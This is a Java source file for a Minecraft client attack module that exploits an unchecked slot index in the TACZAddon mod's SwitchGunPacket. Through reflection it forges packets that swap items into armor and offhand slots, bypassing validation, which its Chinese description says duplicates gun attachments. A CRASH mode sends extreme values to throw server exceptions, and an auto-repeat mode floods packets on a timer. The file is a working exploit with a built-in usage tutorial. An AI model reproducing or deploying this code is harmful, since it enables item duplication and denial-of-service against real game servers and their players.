package com.redblue.red.modules.taczaddon;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.util.List;

/**
 * TACZAddon Vuln #1: SwitchGunPacket arbitrary slot swap.
 *
 * The server handler uses msg.slot directly without bounds checking:
 *   ItemStack target = inventory.getItem(msg.slot).copy();
 *   inventory.setItem(msg.slot, player.getMainHandItem());
 *   inventory.setItem(inventory.selected, target);
 *
 * Valid inventory range is 0-35, but armor slots (36-39) and offhand (40)
 * are accessible via the same Inventory object. Sending slot=36..40 swaps
 * mainhand item with armor/offhand, bypassing armor type validation.
 * Sending extreme values (e.g. 999) causes ArrayIndexOutOfBoundsException.
 */
public class TACZADD01_SlotSwap implements AttackModule {

    private static final Logger LOGGER = LoggerFactory.getLogger("TACZADD01");

    private static final String NETWORK_HANDLER_CLASS =
            "com.mafuyu404.taczaddon.init.NetworkHandler";
    private static final String CHANNEL_FIELD = "CHANNEL";
    private static final String PACKET_CLASS =
            "com.mafuyu404.taczaddon.network.SwitchGunPacket";

    private static boolean reflectionResolved = false;
    private static Constructor<?> packetCtor;

    private final List<ConfigParam> params = List.of(
            ConfigParam.ofBool("enabled", "启用", false),
            ConfigParam.ofEnum("mode", "模式",
                    "ARMOR_SWAP", "ARMOR_SWAP", "OFFHAND_SWAP", "CUSTOM", "CRASH"),
            ConfigParam.ofInt("target_slot", "目标槽位", 36, -1, 999)
                    .visibleWhen("mode", "CUSTOM"),
            ConfigParam.ofEnum("armor_slot", "护甲部位",
                    "HELMET", "HELMET", "CHESTPLATE", "LEGGINGS", "BOOTS")
                    .visibleWhen("mode", "ARMOR_SWAP"),
            ConfigParam.ofInt("crash_value", "崩溃槽位值", 999, 100, 2147483647)
                    .visibleWhen("mode", "CRASH"),
            ConfigParam.ofBool("repeat", "自动重复", false),
            ConfigParam.ofInt("interval", "重复间隔（刻）", 20, 1, 200)
                    .visibleWhen("repeat", "true")
    );

    private long lastTick = 0;

    @Override public String id() { return "taczadd01_slot_swap"; }
    @Override public String name() { return "槽位交换"; }
    @Override public String description() {
        return "利用槽位交换漏洞复制枪械配件";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 选择模式：ARMOR_SWAP（交换护甲）、OFFHAND_SWAP（交换副手）、CUSTOM（自定义槽位）、CRASH（崩溃服务端）\n"
             + "2. 根据模式设置对应参数\n"
             + "3. 点击执行发送数据包\n\n"
             + "[参数说明]\n"
             + "ARMOR_SWAP：将主手物品与选定护甲部位交换\n"
             + "OFFHAND_SWAP：将主手物品与副手槽位(40)交换\n"
             + "CUSTOM：发送自定义槽位索引\n"
             + "CRASH：发送极端值触发服务端异常\n\n"
             + "[注意事项]\n"
             + "护甲槽位映射：36=靴子, 37=护腿, 38=胸甲, 39=头盔\n"
             + "自动重复模式下请合理设置间隔，避免发包过快";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("taczaddon");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        int slot = resolveSlot();
        sendSwapPacket(mc, slot);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        boolean repeat = getParam("repeat").map(ConfigParam::getBool).orElse(false);
        if (!repeat) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private int resolveSlot() {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("ARMOR_SWAP");
        return switch (mode) {
            case "ARMOR_SWAP" -> {
                String piece = getParam("armor_slot").map(ConfigParam::getString)
                        .orElse("HELMET");
                yield switch (piece) {
                    case "BOOTS" -> 36;
                    case "LEGGINGS" -> 37;
                    case "CHESTPLATE" -> 38;
                    case "HELMET" -> 39;
                    default -> 39;
                };
            }
            case "OFFHAND_SWAP" -> 40;
            case "CRASH" -> getParam("crash_value").map(ConfigParam::getInt).orElse(999);
            case "CUSTOM" -> getParam("target_slot").map(ConfigParam::getInt).orElse(36);
            default -> 36;
        };
    }

    private void sendSwapPacket(Minecraft mc, int slot) {
        resolveReflection();
        if (packetCtor == null) {
            chat(mc, "\u00a7c[TACZADD01] Reflection failed - taczaddon not loaded?");
            return;
        }

        try {
            Object packet = packetCtor.newInstance(slot);
            boolean ok = PacketForge.sendViaChannel(
                    NETWORK_HANDLER_CLASS, CHANNEL_FIELD, packet);
            if (ok) {
                chat(mc, "\u00a7a[TACZADD01] Sent SwitchGunPacket(slot=" + slot + ")");
            } else {
                chat(mc, "\u00a7c[TACZADD01] Send failed");
            }
        } catch (Exception e) {
            LOGGER.error("[TACZADD01] Send failed", e);
            chat(mc, "\u00a7c[TACZADD01] Error: " + e.getMessage());
        }
    }

    private static synchronized void resolveReflection() {
        if (reflectionResolved) return;
        reflectionResolved = true;
        try {
            Class<?> clz = Class.forName(PACKET_CLASS);
            packetCtor = clz.getDeclaredConstructor(int.class);
            packetCtor.setAccessible(true);
            LOGGER.info("[TACZADD01] Reflection resolved");
        } catch (Exception e) {
            LOGGER.error("[TACZADD01] Reflection failed", e);
        }
    }

    private static void chat(Minecraft mc, String msg) {
        if (mc.player != null) {
            mc.player.displayClientMessage(Component.literal(msg), false);
        }
    }
}
